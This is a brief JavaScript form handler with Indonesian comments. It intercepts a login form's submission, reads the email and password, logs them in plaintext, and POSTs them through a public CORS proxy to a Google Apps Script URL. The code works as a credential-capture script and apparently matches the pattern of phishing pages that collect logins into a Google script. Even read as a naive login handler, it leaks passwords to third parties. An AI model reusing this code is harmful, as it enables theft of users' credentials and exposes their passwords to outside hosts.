document.querySelector("form").addEventListener("submit", function(event) {
    event.preventDefault();
    let email = document.querySelector("#email").value;
    let password = document.querySelector("#password").value;

    // Menampilkan data yang akan dikirim untuk debugging
    console.log("Data yang akan dikirim:", { email, password });

    fetch('https://cors-anywhere.herokuapp.com/https://script.google.com/macros/s/AKfycbxQT5XtGqzjY8EwZHQR7mrfCfvJ8FtXsixgnYk3SRglTzzLVCwYXl2NxSoOHvU01OjP1A/exec', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email: email, password: password }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('Response from Google Apps Script:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
